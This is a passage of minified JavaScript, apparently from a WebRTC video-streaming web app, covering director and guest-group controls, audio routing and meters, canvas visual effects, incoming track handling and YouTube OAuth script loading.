elements=getById("label_"+UUID);session.directorUUID===UUID?(miniTranslate(elements,"main-director"),elements.classList.remove("addALabel")):(miniTranslate(elements,"add-a-label"),elements.classList.add("addALabel"))}function directorCoDirectorColoring(UUID){if(UUID===session.directorUUID)try{session.rpcs[UUID].stats.info.director=!0,getById("container_"+UUID).classList.add("directorBox")}catch(e){}else if(session.directorList.indexOf(UUID)>=0)try{session.rpcs[UUID].stats.info.coDirector=!0,addDirectorBlue(UUID)}catch(e){}}function addDirectorBlue(UUID){getById("container_"+UUID).classList.add("directorBlue")}function soloLinkGeneratorInit(UUID){document.querySelectorAll("container_"+UUID).forEach((ele=>{ele.querySelectorAll("[data-sololink]").forEach((ele2=>{var soloLink=soloLinkGenerator(session.rpcs[UUID].streamID,!1);ele2.value=soloLink,ele2.href=soloLink,ele2.innerText=soloLink}))}))}function initRecordingImpossible(UUID){var ele;(ele=document.querySelectorAll('[data-action-type="mute-guest"][data--u-u-i-d="'+UUID+'"]'))&&(ele.disabled=!0,ele.title=getTranslation("Audio processing is disabled with this guest. Can't mute or change volume")),(ele=document.querySelectorAll('[data-action-type="volume"][data--u-u-i-d="'+UUID+'"]'))&&(ele.disabled=!0,ele.title=title=getTranslation("Audio processing is disabled with this guest. Can't mute or change volume"),ele.style.opacity=.2)}function initAudioButtons(audioGain,UUID){var ele;0===audioGain?((ele=document.querySelector('[data-action-type="mute-guest"][data--u-u-i-d="'+UUID+'"]'))&&(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",miniTranslate(ele.children[1],"unmute"),session.rpcs[UUID].directorMutedState=1),pokeIframeAPI("director-mute-state",!0,UUID)):(ele=document.querySelector('[data-action-type="volume"][data--u-u-i-d="'+UUID+'"]'))&&(ele.value=audioGain,session.rpcs[UUID].directorVolumeState=audioGain,remoteVolumeUI(ele))}function initGroupButtons(UUID){for(var elements=document.querySelectorAll('[data-action-type="toggle-group"][data--u-u-i-d="'+UUID+'"]'),i=0;i<elements.length;i++){elements[i].classList.remove("pressed"),elements[i].ariaPressed="false";for(var g=0;g<session.rpcs[UUID].group.length;g++)elements[i].dataset.group===session.rpcs[UUID].group[g]&&(elements[i].classList.add("pressed"),elements[i].ariaPressed="true")}}function changeGroupDirector(ele,state=null){var group=ele.dataset.group,index=session.group.indexOf(group),change=!1;return!0===state?(ele.classList.add("pressed"),ele.ariaPressed="true",-1===index&&(session.group.push(group),change=!0)):!1===state||ele.classList.contains("pressed")?(ele.classList.remove("pressed"),ele.ariaPressed="false",index>-1&&(session.group.splice(index,1),change=!0)):(ele.classList.add("pressed"),ele.ariaPressed="true",-1===index&&(session.group.push(group),change=!0)),session.group.length||session.allowNoGroup?session.sendMessage({group:session.group.join(",")}):session.sendMessage({group:!1}),change&&pokeIframeAPI("group-set-updated",session.group),-1!==session.group.indexOf(group)}function changeGroupDirectorAPI(group,state=null,update=!0){if((log("changeGroupDirectorAPI()"),group=sanitizeLabel(group),document.getElementById("container_director"))&&(ele=getById("container_director").querySelector('[data-action-type="toggle-group"][data-group="'+group+'"]')))return update?ele.click():!0===state&&(ele.classList.add("pressed"),ele.ariaPressed="true"),-1!==session.group.indexOf(group);var index=session.group.indexOf(group),eleGroup=getById("groups");eleGroup.classList.remove("hidden");var ele=eleGroup.querySelector('[data-action-type="toggle-group"][data-group="'+group+'"');if(eleGroup.showDirector){if(!ele){ele=htmlToElement('<button style="margin: 0 5px 10px 5px;" data-sid="'+session.streamID+'" data-action-type="toggle-group" data-group="'+group+'"   title="Add to Group: '+group+'" onclick="changeGroupDirector(this);"><span ><i class="las la-users" style="color:#060"></i>'+group+"</span></button>");var added=!1;eleGroup.querySelectorAll("[data-group]").forEach((ele2=>{log(ele2),!added&&ele2.dataset.group>group+""&&(ele2.parentNode.insertBefore(ele,ele2),added=!0)})),added||eleGroup.appendChild(ele)}}else ele||((ele=document.createElement("div")).dataset.actionType="toggle-group",ele.dataset.group=group,ele.classList.add("float"),ele.style.display="inline-block",ele.role="button",ele.innerHTML='<i class="las la-users" aria-hidden="true"></i><br />'+group,eleGroup.appendChild(ele),ele.onclick=function(){changeGroupDirectorAPI(this.dataset.group)});var changed=!1;return!0===state?(eleGroup.showDirector?(ele.classList.add("pressed"),ele.ariaPressed="true"):(ele.classList.add("green"),ele.ariaPressed="true"),-1===index&&(session.group.push(group),changed=!0)):!1===state||ele.classList.contains("green")?(eleGroup.showDirector?(ele.classList.remove("pressed"),ele.ariaPressed="false"):(ele.classList.remove("green"),ele.ariaPressed="false"),index>-1&&(session.group.splice(index,1),changed=!0)):(eleGroup.showDirector?(ele.classList.add("pressed"),ele.ariaPressed="true"):(ele.classList.add("green"),ele.ariaPressed="true"),-1===index&&(session.group.push(group),changed=!0)),update&&(session.group.length||session.allowNoGroup?session.sendMessage({group:session.group.join(",")}):session.sendMessage({group:!1})),changed&&pokeIframeAPI("group-set-updated",session.group),null!==state||-1!==session.group.indexOf(group)}function changeGroupViewDirectorAPI(group,state=null){log("changeGroupViewDirectorAPI()"),group=sanitizeLabel(group);var index=session.groupView.indexOf(group),changed=!1;return!0===state?-1===index&&(session.groupView.push(group),changed=!0):!1===state?index>-1&&(session.groupView.splice(index,1),changed=!0):(index>-1?session.groupView.splice(index,1):session.groupView.push(group),changed=!0),changed&&pokeIframeAPI("group-view-set-updated",session.groupView),null!==state||-1!==session.groupView.indexOf(group)}function changeGroup(ele,state=null){var group=ele.dataset.group,index=session.rpcs[ele.dataset.UUID].group.indexOf(group);return!0===state?(ele.classList.add("pressed"),ele.ariaPressed="true",-1===index&&session.rpcs[ele.dataset.UUID].group.push(group)):!1===state||ele.classList.contains("pressed")?(ele.classList.remove("pressed"),ele.ariaPressed="false",index>-1&&session.rpcs[ele.dataset.UUID].group.splice(index,1)):(ele.classList.add("pressed"),ele.ariaPressed="true",-1===index&&session.rpcs[ele.dataset.UUID].group.push(group)),session.rpcs[ele.dataset.UUID].group.length?session.sendRequest({group:session.rpcs[ele.dataset.UUID].group.join(",")},ele.dataset.UUID):session.sendRequest({group:!1},ele.dataset.UUID),syncDirectorState(ele),-1!==session.rpcs[ele.dataset.UUID].group.indexOf(group)}function changeChannelOffset(UUID,channel){for(var ele=document.querySelectorAll('[data-action-type="add-channel"][data--u-u-i-d="'+UUID+'"]'),i=0;i<ele.length;i++)channel===i?ele[i].classList.contains("pressed")?(ele[i].classList.remove("pressed"),ele[i].ariaPressed="false",channel=!1):(ele[i].classList.add("pressed"),ele[i].ariaPressed="true"):(ele[i].classList.remove("pressed"),ele[i].ariaPressed="false");return session.rpcs[UUID].channelOffset=channel,updateIncomingVideoElement(UUID,!1,!0),!1!==channel}function toggleMonoStereoMic(ele){ele.checked?(session.audioInputChannels=1,getById("micStereoMonoInput").checked=!0,getById("micStereoMonoInput3").checked=!0):urlParams.has("channelcount")||urlParams.has("ac")||urlParams.has("inputchannels")?(session.audioInputChannels=urlParams.get("channelcount")||urlParams.get("ac")||urlParams.get("inputchannels")||0,session.audioInputChannels=parseInt(session.audioInputChannels),session.audioInputChannels||(session.audioInputChannels=!1),getById("micStereoMonoInput").checked=!1,getById("micStereoMonoInput3").checked=!1):(session.audioInputChannels=!1,getById("micStereoMonoInput").checked=!1,getById("micStereoMonoInput3").checked=!1);try{activatedPreview=!1,"micStereoMonoInput3"==ele.id?grabAudio("#audioSource3"):grabAudio("#audioSource")}catch(e){errorlog(e)}}function selectChannel(destination,source,channel){session.audioCtx.destination.channelCountMode="explicit",session.audioCtx.destination.channelInterpretation="discrete",destination.channelCountMode="explicit",destination.channelInterpretation="discrete";try{destination.channelCount=1}catch(e){errorlog("Max channels: "+destination.channelCount)}var splitter=session.audioCtx.createChannelSplitter(6),merger=session.audioCtx.createChannelMerger(1);return source.connect(splitter),splitter.connect(merger,channel-1,0),merger}function offsetChannel(destination,source,offset,width=!1){session.audioCtx.destination.channelCountMode="explicit",session.audioCtx.destination.channelInterpretation="discrete",destination.channelCountMode="explicit",destination.channelInterpretation="discrete";try{destination.channelCount=session.audioChannels}catch(e){errorlog("Max channels: "+destination.channelCount)}if(width)var splitter=session.audioCtx.createChannelSplitter(width),merger=session.audioCtx.createChannelMerger(width+offset);else splitter=session.audioCtx.createChannelSplitter(2),merger=session.audioCtx.createChannelMerger(2+offset);return source.connect(splitter),splitter.connect(merger,0,offset),session.stereo&&3!=session.stereo&&splitter.connect(merger,1,1+offset),merger}function addReverb(source,UUID,trackid,value){if(!0===value)value=Math.random()*(2*Math.random()-1),errorlog(value);else{if(!1===value)return source;(value=parseFloat(value/90)-1||0)<-1&&(value=-1),value>1&&(value=1)}return source.connect(reverbNode),reverbNode}function stereoPanning(source,UUID,trackid,value){if(-1===parseInt(value))value=Math.random()*(2*Math.random()-1),warnlog(value);else{if(!1===value)return source;!0===value?value=90:((value=parseFloat(value/90)-1||0)<-1&&(value=-1),value>1&&(value=1))}var gainNode=session.audioCtx.createGain();session.rpcs[UUID].inboundAudioPipeline[trackid].gainPanNode=gainNode,gainNode.value=1-Math.abs(value)/2,source.connect(gainNode);var panNode=session.audioCtx.createStereoPanner();return session.rpcs[UUID].inboundAudioPipeline[trackid].panNode=panNode,panNode.pan.value=value,gainNode.connect(panNode),panNode}function adjustPan(UUID,value){for(var trackid in!0===value?value=Math.random()*(2*Math.random()-1):!1===value?value=0:((value=parseFloat(value/90)-1||0)<-1&&(value=-1),value>1&&(value=1)),session.rpcs[UUID].inboundAudioPipeline)"panNode"in session.rpcs[UUID].inboundAudioPipeline[trackid]&&session.rpcs[UUID].inboundAudioPipeline[trackid].panNode.pan.setValueAtTime(value,session.audioCtx.currentTime),"gainPanNode"in session.rpcs[UUID].inboundAudioPipeline[trackid]&&session.rpcs[UUID].inboundAudioPipeline[trackid].gainPanNode.setValueAtTime(1-Math.abs(value)/2,session.audioCtx.currentTime)}function addDelayNode(source,UUID,trackid){var delay=parseFloat(session.sync)||0;return delay<0&&(delay=0),session.buffer&&session.buffer>0&&(delay+=parseFloat(session.buffer)),delay/=1e3,session.rpcs[UUID].inboundAudioPipeline[trackid].delayNode=session.audioCtx.createDelay(delay+5),session.rpcs[UUID].inboundAudioPipeline[trackid].delayNode.delayTime.value=delay,source.connect(session.rpcs[UUID].inboundAudioPipeline[trackid].delayNode),log("added new delay node"),session.rpcs[UUID].inboundAudioPipeline[trackid].delayNode}function createStyleCanvas(UUID){if(session.rpcs[UUID].canvas)return!1;if(session.rpcs[UUID].canvas=document.createElement("canvas"),session.rpcs[UUID].canvas.dataset.UUID=UUID,session.rpcs[UUID].streamID&&(session.rpcs[UUID].canvas.dataset.sid=session.rpcs[UUID].streamID),session.rpcs[UUID].canvas.style.pointerEvents="auto",session.rpcs[UUID].canvasCtx=session.rpcs[UUID].canvas.getContext("2d",{alpha:session.alpha}),session.rpcs[UUID].canvas.addEventListener("click",(function(e){log("clicked");try{var uid=e.currentTarget.dataset.UUID;if(e.ctrlKey||e.metaKey){if(e.preventDefault(),!1!==session.statsMenu&&"stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}return e.stopPropagation(),!1}"prePausedBandwidth"in session.rpcs[uid]&&unPauseVideo(e.currentTarget)}catch(e){errorlog(e)}})),session.statsMenu&&"stats"in session.rpcs[UUID]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,UUID),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,UUID)}return session.aspectRatio?1==session.aspectRatio?(session.rpcs[UUID].canvas.width="720",session.rpcs[UUID].canvas.height="1280"):2==session.aspectRatio?(session.rpcs[UUID].canvas.width="960",session.rpcs[UUID].canvas.height="960"):3==session.aspectRatio&&(session.rpcs[UUID].canvas.width="1280",session.rpcs[UUID].canvas.height="960"):(session.rpcs[UUID].canvas.width="1280",session.rpcs[UUID].canvas.height="720"),updateMixer(),!0}function applyStyleEffect(UUID){if(session.rpcs[UUID].canvas&&session.rpcs[UUID].canvasCtx)if(3==session.style)session.rpcs[UUID].canvasCtx.fillStyle="rgb(0, 0, 0)",session.rpcs[UUID].canvasCtx.fillRect(0,0,session.rpcs[UUID].canvas.width,session.rpcs[UUID].canvas.height);else if(4==session.style)session.rpcs[UUID].canvasCtx.fillStyle="rgb(0, 0, 0)",session.rpcs[UUID].canvasCtx.fillRect(0,0,session.rpcs[UUID].canvas.width,session.rpcs[UUID].canvas.height);else if(5==session.style){var r=255*Math.random(),g=255*Math.random(),b=255*Math.random();session.rpcs[UUID].canvasCtx.fillStyle="rgb("+r+", "+g+", "+b+")",session.rpcs[UUID].canvasCtx.fillRect(0,0,session.rpcs[UUID].canvas.width,session.rpcs[UUID].canvas.height)}else if(6==session.style){session.rpcs[UUID].canvasCtx.fillStyle="rgb(0,0,0)",session.rpcs[UUID].canvasCtx.fillRect(0,0,session.rpcs[UUID].canvas.width,session.rpcs[UUID].canvas.height);r=150*Math.random()+50,g=150*Math.random()+50,b=150*Math.random()+50;if(session.rpcs[UUID].canvasCtx.fillStyle="rgb("+r+", "+g+", "+b+")",session.rpcs[UUID].canvasCtx.beginPath(),session.rpcs[UUID].canvasCtx.arc(parseInt(session.rpcs[UUID].canvas.width/2),parseInt(session.rpcs[UUID].canvas.height/2),parseInt(session.rpcs[UUID].canvas.height/4),0,2*Math.PI,!1),session.rpcs[UUID].canvasCtx.fill(),session.rpcs[UUID].label)session.rpcs[UUID].canvasCtx.fillStyle="rgb(0,0,0)",session.rpcs[UUID].canvasCtx.textAlign="center",session.rpcs[UUID].canvasCtx.font=parseInt(session.rpcs[UUID].canvas.height/2.11)+"px Arial",session.rpcs[UUID].canvasCtx.fillText(session.rpcs[UUID].label[0].toUpperCase(),parseInt(session.rpcs[UUID].canvas.width/2),parseInt(2*session.rpcs[UUID].canvas.height/3));else{var tmp=getComputedStyle(document.querySelector(":root")).getPropertyValue("--video-background-image").split('"');if(3===tmp.length){var img=new Image;img.onload=function(){session.rpcs[UUID].canvasCtx.fillStyle="rgb(25,0,0)",session.rpcs[UUID].canvasCtx.drawImage(img,parseInt(session.rpcs[UUID].canvas.width/2-110),parseInt(session.rpcs[UUID].canvas.height/2-110),220,220)},img.src=tmp[1]}}}}function capitalizeFirstLetter(string){return string.charAt(0).toUpperCase()+string.slice(1)}function fftWaveform(source,UUID,trackid){session.rpcs[UUID].inboundAudioPipeline[trackid].analyser=session.audioCtx.createAnalyser(),session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.fftSize=512;var bufferLength=session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.frequencyBinCount,dataArray=new Uint8Array(bufferLength);session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.getByteTimeDomainData(dataArray),source.connect(session.rpcs[UUID].inboundAudioPipeline[trackid].analyser),createStyleCanvas(UUID),clearInterval(session.rpcs[UUID].canvasIntervalAction);var canvasIntervalAction=setInterval((function(uuid){if(2===session.style)try{session.rpcs[uuid].inboundAudioPipeline[trackid].analyser.getByteTimeDomainData(dataArray),session.rpcs[uuid].canvasCtx.fillStyle="rgba(0, 0, 0, 0.1)",session.rpcs[uuid].canvasCtx.fillRect(0,0,session.rpcs[uuid].canvas.width,session.rpcs[uuid].canvas.height),session.rpcs[uuid].canvasCtx.lineWidth=10,session.rpcs[uuid].canvasCtx.strokeStyle="rgb(111, 255, 111)";var sliceWidth=1*session.rpcs[uuid].canvas.width/bufferLength,loudness=dataArray,Mean=loudness.map((val=>(val-128)*(val-128))).reduce(((acum,val)=>acum+val))/loudness.length;if(loudness=10*Math.sqrt(Mean),session.rpcs[uuid].stats.Audio_Loudness=parseInt(loudness),1==session.pushLoudness){var loudnessObj={};loudnessObj[session.rpcs[uuid].streamID]=session.rpcs[uuid].stats.Audio_Loudness,isIFrame&&parent.postMessage({loudness:loudnessObj,action:"loudness",value:loudness,UUID:uuid},session.iframetarget)}if(loudness<2)return;session.rpcs[uuid].canvasCtx.beginPath();var m=session.rpcs[uuid].canvas.height/256;session.rpcs[uuid].canvasCtx.moveTo(0,dataArray[0]*m);for(var x=0,i=1;i<bufferLength;i++){var y=dataArray[i]*m;session.rpcs[uuid].canvasCtx.lineTo(x,y),x+=sliceWidth}session.rpcs[uuid].canvasCtx.lineTo(session.rpcs[uuid].canvas.width,session.rpcs[uuid].canvas.height/2),session.rpcs[uuid].canvasCtx.stroke()}catch(e){warnlog(e),warnlog("Did the remote source disconnect?"),clearInterval(canvasIntervalAction),warnlog(session.rpcs[uuid])}else clearInterval(canvasIntervalAction)}),50,UUID);return session.rpcs[UUID].canvasIntervalAction=canvasIntervalAction,session.rpcs[UUID].inboundAudioPipeline[trackid].analyser}function audioMeterGuest(mediaStreamSource,UUID,trackid){log("audioMeterGuest started"),session.rpcs[UUID].inboundAudioPipeline[trackid].analyser=session.audioCtx.createAnalyser(),mediaStreamSource.connect(session.rpcs[UUID].inboundAudioPipeline[trackid].analyser),session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.fftSize=256,session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.smoothingTimeConstant=.05;var bufferLength=session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.frequencyBinCount,dataArray=new Uint8Array(bufferLength);function updateLevels(){try{if(!session.rpcs[UUID])return;session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.getByteFrequencyData(dataArray);for(var total=0,i=0;i<dataArray.length;i++)total+=dataArray[i];if(total=parseInt(total/150),session.rpcs[UUID].stats.Audio_Loudness=total,1==session.pushLoudness){var loudnessObj={};loudnessObj[session.rpcs[UUID].streamID]=session.rpcs[UUID].stats.Audio_Loudness,isIFrame&&parent.postMessage({loudness:loudnessObj,action:"loudness",value:session.rpcs[UUID].stats.Audio_Loudness,UUID:UUID},session.iframetarget)}try{clearTimeout(session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.interval),session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.interval=setTimeout((function(){updateLevels()}),100)}catch(e){log("closing old inaudio pipeline")}if(3==session.style||session.meterStyle){if(session.rpcs[UUID].videoElement){if(session.rpcs[UUID].videoElement.dataset.speaking=total>40?"2":total>10?"1":"0",4==session.meterStyle)return void(session.rpcs[UUID].videoElement.dataset.loudness=total)}else if(4==session.meterStyle)return}else{if(!1!==session.scene)return;if(!1===session.audioMeterGuest)return}if(session.rpcs[UUID].voiceMeter)if(session.rpcs[UUID].voiceMeter.dataset.level=total,1==session.meterStyle){var perct=Math.min(total,100);if(session.rpcs[UUID].voiceMeter.style.height=perct+"%",total>80){var R=parseInt(255*perct/100).toString(16).padStart(2,"0"),G=parseInt(255-255*perct/100).toString(16).padStart(2,"0");session.rpcs[UUID].voiceMeter.style.backgroundColor="#"+R+G+"00"}else session.rpcs[UUID].voiceMeter.style.backgroundColor="#00FF00"}else session.rpcs[UUID].voiceMeter.style.opacity=total>15?100:0;else session.rpcs[UUID].voiceMeter=document.createElement("div"),session.rpcs[UUID].voiceMeter.id="voiceMeter_"+UUID,session.rpcs[UUID].voiceMeter.dataset.level=total,1==session.meterStyle?session.rpcs[UUID].voiceMeter.classList.add("video-meter2"):(session.rpcs[UUID].voiceMeter.style.opacity=total>15?100:0,2==session.meterStyle?session.rpcs[UUID].voiceMeter.classList.add("video-meter-2"):session.rpcs[UUID].voiceMeter.classList.add("video-meter")),updateMixer()}catch(e){return void warnlog(e)}}return clearTimeout(session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.interval),session.rpcs[UUID].inboundAudioPipeline[trackid].analyser.interval=setTimeout((function(){updateLevels()}),100),session.rpcs[UUID].inboundAudioPipeline[trackid].analyser}function effectsDynamicallyUpdate(event,ele){if(log("effectsDynamicallyUpdate"),session.effect=ele.options[ele.selectedIndex].value,getById("selectImageTFLITE").style.display="none",getById("selectImageTFLITE3").style.display="none",getById("selectEffectAmount").style.display="none",getById("selectEffectAmount3").style.display="none","1"!==session.effect){if("7"===session.effect)return getById("selectEffectAmount").style.display="block",getById("selectEffectAmount3").style.display="block",session.effectValue_default?session.effectValue=session.effectValue_default:session.effectValue=1,getById("selectEffectAmountInput").min=1,getById("selectEffectAmountInput").max=1.99,getById("selectEffectAmountInput").step=.01,getById("selectEffectAmountInput3").min=1,getById("selectEffectAmountInput3").max=1.99,getById("selectEffectAmountInput3").step=.01,getById("selectEffectAmountInput").value=session.effectValue,getById("selectEffectAmountInput3").value=session.effectValue,void updateRenderOutpipe();if("8"!==session.effect)if("3a"==session.effect&&(session.effect="3",session.effectValue=5),!1===session.effectValue_default&&"3"==session.effect?session.effectValue=2:session.effectValue=session.effectValue_default,"0"!=session.effect&&session.effect){if("3"===session.effect||"4"===session.effect)attemptTFLiteJsFileLoad(),session.tfliteModule.looping||updateRenderOutpipe(),"3"===session.effect&&0==session.effectValue_default&&(getById("selectEffectAmount").style.display="block",getById("selectEffectAmount3").style.display="block",getById("selectEffectAmountInput").min=0,getById("selectEffectAmountInput").max=20,getById("selectEffectAmountInput").step=1,getById("selectEffectAmountInput3").min=0,getById("selectEffectAmountInput3").max=20,getById("selectEffectAmountInput3").step=1,getById("selectEffectAmountInput").value=session.effectValue,getById("selectEffectAmountInput3").value=session.effectValue);else if("5"===session.effect)attemptTFLiteJsFileLoad(),session.tfliteModule.looping||updateRenderOutpipe(),loadTFLITEImages();else if("6"===session.effect){if(gpgpuSupport){if("Google SwiftShader"==gpgpuSupport)return void(session.cleanOutput||warnUser("Hardware acceleration isn't detected.<br /><br />Please enable it for this effect to work correctly.<br /><br /><i>Settings -> Advanced -> System -> Use hardware-accleration</i>",!1,!1))}else if(!session.cleanOutput)return void warnUser("Hardware acceleration isn't detected.<br /><br />This effect will not work",4e3,!1);loadTensorflowJS(),updateRenderOutpipe()}else updateRenderOutpipe();!1===session.permaid&&!1===session.roomid&&!1===session.view&&!1===session.director&&updateURL("effects")}else updateRenderOutpipe();else updateRenderOutpipe()}else updateRenderOutpipe()}function loadTFLITEImages(){if("5"===session.effect){if(session.defaultBackgroundImages){try{session.defaultBackgroundImages.reverse()}catch(e){return errorlog("Could not process image list"),session.defaultBackgroundImages=!1,void(session.selectImageTFLITE_contents=getById("selectImageTFLITE_contents"))}session.defaultBackgroundImages.forEach((imgSrc=>{try{var img=document.createElement("img");img.onerror=function(){this.style.display="none"},img.crossOrigin="Anonymous",img.src=imgSrc,img.style="max-width:130px;max-height:73.5px;display:inline-block;margin:10px;cursor:pointer;",img.onclick=function(event){changeTFLiteImage(event,this)},getById("selectImageTFLITE_contents").prepend(img)}catch(e){}})),session.defaultBackgroundImages=!1,session.selectImageTFLITE_contents=getById("selectImageTFLITE_contents")}else session.selectImageTFLITE_contents||(session.selectImageTFLITE_contents=getById("selectImageTFLITE_contents"));document.getElementById("selectImageTFLITE")?(document.getElementById("selectImageTFLITE").style.display="block",document.getElementById("selectImageTFLITE").appendChild(session.selectImageTFLITE_contents),session.selectImageTFLITE_contents.classList.remove("hidden")):document.getElementById("selectImageTFLITE3")&&(document.getElementById("selectImageTFLITE3").style.display="block",document.getElementById("selectImageTFLITE3").appendChild(session.selectImageTFLITE_contents),session.selectImageTFLITE_contents.classList.remove("hidden"))}}session.onTrack=function(event,UUID){if(session.badStreamList.includes(session.rpcs[UUID].streamID))errorlog("new connection is contained in badStreamList 2! This shouldn't happen");else{var newTracks=[],newStream=!1;if(event.streams&&event.streams[0])newTracks=(newStream=event.streams[0]).getTracks();else{if(!event.track)return void errorlog("Something went wrong with incoming track..");newTracks.push(event.track)}if(session.rpcs[UUID].streamSrc)for(var tracks=session.rpcs[UUID].streamSrc.getTracks(),i=0;i<newTracks.length;i++)for(var j=0;j<tracks.length;j++)if(newTracks[i].id==tracks[j].id&&newTracks[i].kind==tracks[j].kind){newTracks.splice(i,1),i--;break}var screenshare=!1;if(session.rpcs[UUID].screenIndexes&&session.rpcs[UUID].screenIndexes.length){log("session.rpcs[UUID].screenIndexes: "+session.rpcs[UUID].screenIndexes);var receievers=session.rpcs[UUID].getReceivers();for(i=0;i<receievers.length;i++){for(j=0;j<newTracks.length;j++){if(receievers[i].track&&receievers[i].track.id==newTracks[j].id&&receievers[i].track.kind==newTracks[j].kind)for(var k=0;k<session.rpcs[UUID].screenIndexes.length;k++)if(session.rpcs[UUID].screenIndexes[k]==i){screenshare=!0;break}if(screenshare)break}if(screenshare)break}}log("screenshare: "+screenshare);try{for(var index=newTracks.length;index--;)if("video"==newTracks[index].kind){if(!1!==session.novideo&&!session.novideo.includes(session.rpcs[UUID].streamID)){newTracks.splice(index,1);continue}if(session.rpcs[UUID].settings&&session.rpcs[UUID].settings.allowscreenvideo&&screenshare)continue;if(session.rpcs[UUID].settings&&!session.rpcs[UUID].settings.video){newTracks.splice(index,1);continue}}else if("audio"==newTracks[index].kind){if(!1!==session.noaudio&&!session.noaudio.includes(session.rpcs[UUID].streamID)){newTracks.splice(index,1);continue}if(session.rpcs[UUID].settings&&session.rpcs[UUID].settings.allowscreenaudio&&screenshare)continue;if(session.rpcs[UUID].settings&&!session.rpcs[UUID].settings.audio){newTracks.splice(index,1);continue}}}catch(e){errorlog(e)}if(newTracks.length){if(session.encodedInsertableStreams)for(receievers=session.rpcs[UUID].getReceivers(),i=0;i<receievers.length;i++)for(j=0;j<newTracks.length;j++)if(receievers[i].track&&receievers[i].track.id==newTracks[j].id&&receievers[i].track.kind==newTracks[j].kind)try{setupReceiverTransform(receievers[i])}catch(e){errorlog(e)}if(!screenshare){playoutdelay(UUID),session.directorSpeakerMute(),session.directorDisplayMute(),newStream&&(newStream.onremovetrack=function(e1){try{warnlog("Track was removed"),session.rpcs[UUID].streamSrc.getTracks().forEach((trk=>{trk.id==e1.track.id&&trk.kind==e1.track.kind&&session.rpcs[UUID].streamSrc.removeTrack(trk)})),"video"==e1.track.kind?updateIncomingVideoElement(UUID,!0,!1):updateIncomingVideoElement(UUID,!1,!0),setTimeout((function(){updateMixer()}),1)}catch(e){}},newStream.onerror=function(e1){errorlog(e1);try{warnlog("Track threw an error; going to reconnect it"),session.rpcs[UUID].streamSrc.getTracks().forEach((trk=>{try{trk.id==e1.track.id&&trk.kind==e1.track.kind&&session.rpcs[UUID].streamSrc.removeTrack(trk)}catch(e){}})),"video"==e1.track.kind?updateIncomingVideoElement(UUID,!0,!1):updateIncomingVideoElement(UUID,!1,!0),setTimeout((function(){updateMixer()}),1)}catch(e){errorlog(e)}}),createRichVideoElement(UUID),session.rpcs[UUID].streamSrc||(session.rpcs[UUID].streamSrc=createMediaStream(),mediaSourceUpdated(UUID,session.rpcs[UUID].streamID));var videoAdded=!1,audioAdded=!1;return newTracks.forEach((trk=>{"video"==trk.kind?videoAdded=!0:"audio"==trk.kind&&(audioAdded=!0),log("adding track"),session.rpcs[UUID].streamSrc.addTrack(trk)})),newTracks.length>session.rpcs[UUID].streamSrc.getTracks().length&&(errorlog("Not all the tracks were added to the local stream; are the tracks' IDs not unique?"),console.log("streamSrc total tracks: "+session.rpcs[UUID].streamSrc.getTracks().length)),isIFrame&&session.sendframes&&newTracks.forEach((async trk=>{for(log("STARTING NEW VIDEO TRACK"),trk.frameReader=new MediaStreamTrackProcessor(trk).readable.getReader();;)try{const{done:done,value:value}=await trk.frameReader.read();if(done){value&&value.close();break}try{parent.postMessage({frame:value,UUID:UUID,streamID:session.rpcs[UUID].streamID,trackID:trk.id,kind:trk.kind},session.sendframes,[value])}finally{value.close()}}catch(e){log("Error processing video frame: ",e);break}})),audioAdded&&videoAdded?updateIncomingVideoElement(UUID):videoAdded?updateIncomingVideoElement(UUID,!0,!1):audioAdded&&(updateIncomingVideoElement(UUID,!1,!0),session.roomid||!session.view||session.permaid||setTimeout((function(){updateMixer()}),10)),session}session.setupScreenShareAddon(newTracks,UUID)}else warnlog("NO NEW TRACKS?")}};var effectsLoaded={},JEELIZFACEFILTER=null;async function loadEffect(effect){warnlog("effect:"+effect);var filename=effect.replace(/\W/g,"");if(effectsLoaded[filename])effectsLoaded[filename]();else{effectsLoaded[filename]=function(){},warnlog("Loading Effect: "+effect);var script=document.createElement("script");script.onload=async function(){log("LOADED EFFECT"),effectsLoaded[filename]=await effectsEngine(filename),log("effectsEngine();"),"Google SwiftShader"==gpgpuSupport&&(session.cleanOutput||warnUser("Hardware acceleration isn't detected.<br /><br />Please enable it for better performance.<br /><br /><i>Settings -> Advanced -> System -> Use hardware-accleration</i>",!1,!1)),effectsLoaded[filename]()},script.src="./filters/"+filename+".js?"+parseInt(1e3*Math.random()),document.head.appendChild(script),warnUser("Loading custom effects model...",1e3)}}async function loadScript(url,callback=!1){var res=null,promise=new Promise(((resolve,reject)=>{res=resolve,reject}));if(document.querySelector("script[src='"+url+"']"))callback&&callback();else{var script=document.createElement("script");script.type="text/javascript",script.src=url,script.onload=function(){res(),callback&&callback()},document.head.appendChild(script)}return await promise}var tokenClient=!1;function YoutubeChatInterface(remote=!1){if(!tokenClient){tokenClient=!0;var gisInited=!1,gapiInited=!1,busy=0;loadScript("https://apis.google.com/js/api.js",(function gapiLoaded(){gapi.load("client",initializeGapiClient)})),loadScript("https://accounts.google.com/gsi/client",(function gisLoaded(){tokenClient=google.accounts.oauth2.initTokenClient({client_id:session.youtubeKey.split(",")[0],scope:"https://www.googleapis.com/auth/youtube",callback:""}),gisInited=!0,maybeEnableButtons()}))}function maybeEnableButtons(){gapiInited&&gisInited&&function handleAuthClick(){tokenClient.callback=async resp=>{resp.error&&errorlog(resp.error),closeModal();var auths=gapi.client.getToken();auths&&setStorage("YoutubeAuth",JSON.stringify(auths),auths.expires_in||3600),listBroadcasts()};var saved=getStorage("YoutubeAuth");saved?(gapi.client.setToken(JSON.parse(saved)),listBroadcasts()):null===gapi.client.getToken()?remote?tokenClient.requestAccessToken({prompt:"consent"}):warnUser("<button 